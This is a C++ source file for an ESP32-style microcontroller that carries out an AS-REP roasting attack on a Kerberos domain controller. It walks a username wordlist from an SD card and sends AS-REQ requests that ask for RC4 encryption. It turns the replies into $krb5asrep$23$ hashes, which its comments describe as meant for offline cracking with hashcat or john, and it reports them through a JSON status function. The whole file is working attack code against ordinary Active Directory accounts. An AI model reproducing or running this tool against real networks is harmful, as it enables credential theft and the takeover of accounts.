#include "asreproast.h"
#include "krbcommon.h"
#include <ArduinoJson.h>
#include <vector>

namespace {
    volatile bool g_running = false;
    volatile bool g_stopReq = false;
    IPAddress g_kdc;
    uint16_t g_port = 88;
    String g_realm, g_wordlist, g_error;
    volatile uint32_t g_done = 0;
    uint32_t g_total = 0;

    struct Found { String user; int etype; String hash; };
    std::vector<Found> g_found;
    SemaphoreHandle_t g_mtx = nullptr;
    TaskHandle_t g_task = nullptr;

    String toHex(const uint8_t *buf, size_t len) {
        String s; s.reserve(len * 2);
        const char *hexd = "0123456789abcdef";
        for (size_t i = 0; i < len; ++i) { s += hexd[(buf[i] >> 4) & 0xF]; s += hexd[buf[i] & 0xF]; }
        return s;
    }

    // Parses a bare AS-REP and extracts its enc-part {etype, cipher}.
    bool parseAsRepEncPart(const uint8_t *msg, int len, int &etype, const uint8_t *&cipher, int &cipherLen) {
        uint8_t tag; int l, vo, no;
        if (!Krb::readTlvAt(msg, 0, len, tag, l, vo, no) || tag != 0x6B) return false;
        uint8_t seqTag; int seqLen, seqVo, seqNo;
        if (!Krb::readTlvAt(msg, vo, no, seqTag, seqLen, seqVo, seqNo) || seqTag != 0x30) return false;

        int pos = seqVo;
        while (pos < seqNo) {
            uint8_t fTag; int fLen, fVo, fNo;
            if (!Krb::readTlvAt(msg, pos, seqNo, fTag, fLen, fVo, fNo)) break;
            if (fTag == 0xA6) {                                       // enc-part [6]
                uint8_t edSeqTag; int edLen, edVo, edNo;
                if (!Krb::readTlvAt(msg, fVo, fNo, edSeqTag, edLen, edVo, edNo)) return false;
                int ep = edVo;
                etype = -1; cipher = nullptr; cipherLen = 0;
                while (ep < edNo) {
                    uint8_t eTag; int eLen, eVo, eNo;
                    if (!Krb::readTlvAt(msg, ep, edNo, eTag, eLen, eVo, eNo)) break;
                    if (eTag == 0xA0) {                               // etype [0]
                        uint8_t iTag; int iLen, iVo, iNo;
                        if (Krb::readTlvAt(msg, eVo, eNo, iTag, iLen, iVo, iNo) && iLen >= 1) etype = msg[iVo];
                    } else if (eTag == 0xA2) {                        // cipher [2]
                        uint8_t oTag; int oLen, oVo, oNo;
                        if (Krb::readTlvAt(msg, eVo, eNo, oTag, oLen, oVo, oNo)) { cipher = msg + oVo; cipherLen = oLen; }
                    }
                    ep = eNo;
                }
                return etype >= 0 && cipher != nullptr;
            }
            pos = fNo;
        }
        return false;
    }

    // One AS-REQ round trip on a fresh connection. Returns the heap-allocated
    // reply (caller frees) or nullptr if the exchange failed.
    uint8_t *askKdc(const String &user, const int *etypes, int nEtypes, int &rlen) {
        WiFiClient c;
        if (!c.connect(g_kdc, g_port, 3000)) return nullptr;
        uint8_t pkt[768];
        int len = Krb::buildAsReq(pkt, sizeof(pkt), user, g_realm, etypes, nEtypes);
        uint8_t *resp = nullptr;
        if (len > 0 && Krb::sendFramed(c, pkt, len)) resp = Krb::recvFramed(c, rlen, 3000);
        c.stop();
        return resp;
    }

    void record(const String &user, int etype, const String &hash) {
        Found fo; fo.user = user; fo.etype = etype; fo.hash = hash;
        if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
        g_found.push_back(fo);
        if (g_mtx) xSemaphoreGive(g_mtx);
    }

    void roastUser(const String &user) {
        // RC4 first: that's the only AS-REP format hashcat/john crack here
        // (mode 18200). Asking for AES first makes the KDC answer with an
        // AES-encrypted AS-REP, which is found but not usable.
        static const int RC4[] = {23};
        static const int AES[] = {18, 17};
        int rlen = 0;
        uint8_t *resp = askKdc(user, RC4, 1, rlen);
        if (!resp) return;

        int etype, cipherLen; const uint8_t *cipher;
        if (parseAsRepEncPart(resp, rlen, etype, cipher, cipherLen)) {
            String hash;
            if (etype == 23 && cipherLen > 16)
                hash = "$krb5asrep$23$" + user + "@" + g_realm + ":" +
                       toHex(cipher, 16) + "$" + toHex(cipher + 16, cipherLen - 16);
            record(user, etype, hash);
        } else if (Krb::errorCode(resp, rlen) == Krb::ERR_ETYPE_NOSUPP) {
            // RC4 disabled for this account (or domain): see whether it is
            // roastable at all by asking for AES. No crackable hash then.
            free(resp);
            resp = askKdc(user, AES, 2, rlen);
            if (resp && parseAsRepEncPart(resp, rlen, etype, cipher, cipherLen)) record(user, etype, "");
        }
        free(resp);
    }

    void runRoast() {
        g_total = Krb::countWords(g_wordlist.c_str(), 64);
        File f = SD.open(g_wordlist.c_str(), FILE_READ);
        if (!f) { g_error = "wordlist not found: " + g_wordlist; return; }
        String user;
        while (!g_stopReq && Krb::nextWord(f, user, 64)) {
            roastUser(user);
            g_done++;
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        f.close();
    }

    void roastTask(void *) {
        runRoast();
        g_running = false;
        g_task = nullptr;
        vTaskDelete(nullptr);
    }
}

namespace AsRepRoast {

bool start(const IPAddress &kdc, const String &realm, const String &wordlistPath, uint16_t port) {
    if (g_running) return false;
    if (!g_mtx) g_mtx = xSemaphoreCreateMutex();

    g_kdc = kdc;
    g_port = port;
    g_realm = Krb::upperRealm(realm);
    g_wordlist = wordlistPath;
    g_error = "";
    g_done = 0;
    g_total = 0;
    g_stopReq = false;

    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    g_found.clear();
    if (g_mtx) xSemaphoreGive(g_mtx);

    g_running = true;
    xTaskCreatePinnedToCore(roastTask, "asreproast", 12288, nullptr, 1, &g_task, 0);
    return true;
}

void stop() { g_stopReq = true; }

String status() {
    JsonDocument doc;
    doc["running"] = g_running;
    doc["done"] = g_done;
    doc["total"] = g_total;
    doc["kdc"] = g_kdc.toString();
    doc["realm"] = g_realm;
    doc["error"] = g_error;

    JsonArray arr = doc["found"].to<JsonArray>();
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    for (auto &fo : g_found) {
        JsonObject o = arr.add<JsonObject>();
        o["user"] = fo.user;
        o["etype"] = fo.etype;
        o["hash"] = fo.hash;
    }
    if (g_mtx) xSemaphoreGive(g_mtx);

    String out;
    serializeJson(doc, out);
    return out;
}

} // namespace AsRepRoast
